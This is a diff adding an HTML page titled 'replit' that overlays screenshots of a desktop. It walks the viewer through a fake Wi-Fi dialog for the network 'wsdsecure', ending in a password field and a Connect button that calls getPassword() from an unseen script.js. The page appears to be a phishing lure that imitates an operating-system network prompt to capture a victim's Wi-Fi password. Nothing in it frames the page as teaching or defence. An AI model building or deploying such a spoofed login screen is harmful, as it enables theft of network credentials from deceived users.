@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width">
+    <title>replit</title>
+  </head>
+  <style>
+    body {
+      margin: 0px;
+      background: black;
+      font-family: Arial, Helvetica, sans-serif;
+    }
+    .mainImage {
+      width: 100vw;
+      height: 100vh;
+      z-index: -10000;
+    }
+    .button1 { 
+      z-index: 1000;
+      
+      margin-left: calc(100% - 113px);
+      margin-top: calc(100vh - 48px);
+      position: absolute;
+      cursor: pointer;
+    }
+    .button2 { 
+      z-index: 1000;
+      
+      margin-left: calc(100% - 368px);
+      margin-top: calc(100vh - 494px);
+      position: absolute;
+    }
+    .button3 { 
+      z-index: 1000;
+      
+      margin-left: calc(100% - 112px - 368px + 130px);
+      margin-top: calc(100vh - 112px - 494px + 160px);
+      position: absolute;
+      cursor: pointer;
+    }
+    .button4 { 
+      z-index: 1000;
+      
+      margin-left: calc(100% - 112px - 368px + 120px);
+      margin-top: calc(100vh - 112px - 494px + 340px);
+      position: absolute;
+      cursor: pointer;
+    }
+    .button5 { 
+      z-index: 1000;
+      
+      margin-left: calc(50% - 230px);
+      margin-top: calc(50vh - 136px);
+      position: absolute;
+      background-color: #f1f3f4;
+      height: 30px;
+    }
+    .button5 p {
+      margin-top: 3px;
+      color: grey;
+    }
+    .password1 { 
+      z-index: 1000;
+      
+      margin-left: calc(50% - 230px);
+      margin-top: calc(50vh);
+      position: absolute;
+    }
+    input {
+      background-color: #f1f3f4;
+      width: 400px;
+      border: 0px;
+    }
+    .send1 { 
+      z-index: 1000;
+      width: 75px;
+      
+      margin-left: calc(50% + 162px);
+      margin-top: calc(50vh + 113px);
+      position: absolute;
+      background-color: #1a73e8;
+      height: 25px;
+      text-align: center;
+      font-size: 12px;
+      cursor: pointer;
+    }
+    .send1 p {
+      margin-top: 6px;
+      color: white;
+    }
+    .cancel1 { 
+      z-index: 1000;
+      width: 70px;
+      
+      margin-left: calc(50% + 81px);
+      margin-top: calc(50vh + 113px);
+      position: absolute;
+      background-color: white;
+      height: 25px;
+      text-align: center;
+      font-size: 12px;
+      cursor: pointer;
+    }
+    .cancel1 p {
+      margin-top: 6px;
+      color: #1a73e8;
+    }
+  </style>
+  <body>
+    <div onclick="changeScreen(2);" id="button1" class="button1">
+      <img src="Screen2 (1).png">
+    </div>
+    <div onclick="changeScreen(2);" id="button2" class="button2" style="display: none;">
+      <img src="Screen2.png">
+    </div>
+    <div onclick="changeScreen(3);" id="button3" class="button3" style="display: none;">
+      <img src="wifiBtn.png">
+    </div>
+    <div onclick="changeScreen(4);" id="button4" class="button4" style="display: none;">
+      <img src="Screen3 (2).jpg">
+    </div>
+    <div id="button5" class="button5" style="display: none;">
+      <p>wsdsecure</p>
+    </div>
+    <div onclick="changeScreen(4);" id="password1" class="password1" style="display: none;">
+      <input id="wifiPassword" type="password">
+    </div>
+    <div onclick="changeScreen(1);getPassword();" id="send1" class="send1" style="display: none;">
+      <p>Connect</p>
+    </div>
+    <div onclick="changeScreen(1);" id="cancel1" class="cancel1" style="display: none;">
+      <p>Cancel</p>
+    </div>
+    <img class="mainImage" id="image1" src="Screen1.png">
+    <script src="script.js"></script>
+  </body>
+</html>
